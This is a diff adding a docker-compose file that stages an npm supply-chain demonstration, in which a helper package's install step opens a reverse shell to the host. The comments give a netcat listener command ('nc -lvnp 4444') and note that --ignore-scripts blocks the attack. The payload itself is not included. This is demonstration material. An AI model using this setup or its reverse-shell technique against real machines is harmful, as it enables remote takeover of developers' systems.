@@ -1,0 +1,18 @@
+# npm supply-chain demo: `npm install` of a benign-looking helper pops a reverse shell.
+# On stage:
+#   1) host terminal:  nc -lvnp 4444
+#   2) run:            docker compose run --rm victim
+#   3) watch the shell land in terminal 1, before the app's own code ever runs.
+services:
+  victim:
+    image: node:20-alpine
+    working_dir: /app/victim-app
+    environment:
+      - LISTENER_HOST=host.docker.internal
+      - LISTENER_PORT=4444
+    extra_hosts:
+      - "host.docker.internal:host-gateway"
+    volumes:
+      - ./:/app
+    # The whole attack is the install step. --ignore-scripts would stop it (see README).
+    command: sh -c "npm install && echo '[victim] install finished, now running app...' && node index.js"
